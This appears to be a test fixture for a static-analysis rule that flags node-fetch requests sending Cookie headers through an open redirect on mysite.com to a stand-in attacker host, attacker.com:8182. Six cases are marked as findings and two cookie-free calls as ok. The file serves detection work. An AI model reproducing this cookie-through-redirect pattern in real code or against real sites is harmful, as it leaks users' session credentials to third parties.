import fetch from 'node-fetch';

const body = {a: 1};

// ruleid: node-fetch-cookie-leak
const response = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    method: 'post',
    body: JSON.stringify(body),
    headers: {'Cookie': 'asd=ad'}
});

const cookie2 = 'asd=ad';
// ruleid: node-fetch-cookie-leak
const response2 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    headers: {'Cookie': cookie2}
});

var cookie3 = 'name=' + window.prompt('Enter your name');
// ruleid: node-fetch-cookie-leak
const response3 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    method: 'post',
    body: JSON.stringify(body),
    headers: {'Cookie': cookie3}
});

const headers4 = {'Cookie': cookie3};
// ruleid: node-fetch-cookie-leak
const response4 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    method: 'post',
    body: JSON.stringify(body),
    headers: headers4
});

const options5 = {method: 'post', body: 'wahoo', headers: {'Cookie': cookie3}};
// ruleid: node-fetch-cookie-leak
const response5 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', options5);

const options6 = {method: 'post', body: 'wahoo', headers: headers4};
// ruleid: node-fetch-cookie-leak
const response6 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', options6);

// ok
const response7 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd');

// ok
const response8 = await fetch('http://mysite.com/redirect.php?url=http://attacker.com:8182/dd', {
    method: 'post',
    body: JSON.stringify(body),
});

